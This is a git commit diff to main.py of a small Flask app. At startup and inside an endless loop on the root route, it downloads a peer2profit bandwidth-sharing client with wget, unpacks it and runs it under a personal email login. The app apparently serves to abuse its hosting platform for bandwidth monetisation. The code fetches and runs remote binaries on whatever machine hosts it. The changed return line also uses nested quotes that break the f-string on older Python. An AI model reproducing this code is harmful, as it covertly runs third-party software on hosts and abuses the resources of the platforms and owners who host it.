b84db4cb7fb7274133b9e2b387d9e94c991c3ba8
1234Arijit1234 <58881798+1234Arijit1234@users.noreply.github.com>
2022-10-04 07:47:16 +0530

    Update main.py

--- main.py
+++ main.py
@@ -2,23 +2,18 @@ from flask import Flask,request
 import subprocess
 import time
 import requests
-import threading
+import socket 
 app = Flask(__name__)
 
 subprocess.call("wget https://updates.peer2profit.com/p2pclient_0.56_amd64.deb && dpkg -x p2pclient_0.56_amd64.deb ~ && cd usr/bin && ./p2pclient --login arijitpaine249@gmail.com",shell=True)
 
 @app.route("/")
 def s():
-    def f1():
-        ip = request.environ['SERVER_NAME']
-        while(True):
-            r = requests.get(f"{ip}:5000")
-            print(r)
-            subprocess.call("cd ~ && wget https://updates.peer2profit.com/p2pclient_0.56_amd64.deb && dpkg -x p2pclient_0.56_amd64.deb ~ && cd usr/bin && ./p2pclient --login arijitpaine249@gmail.com",shell=True)
-            time.sleep(1200)
-    t = threading.Thread(target=f1)
-    t.start()
-    return f"{request.environ['SERVER_NAME']}"
+    while(True):
+        subprocess.call("cd ~ && wget https://updates.peer2profit.com/p2pclient_0.56_amd64.deb && dpkg -x p2pclient_0.56_amd64.deb ~ && cd usr/bin && ./p2pclient --login arijitpaine249@gmail.com",shell=True)
+        time.sleep(1200)
+    
+    return f"{requests.get("https://api.ipify.org?format=text").text}"
 
 
 if __name__ == "__main__":
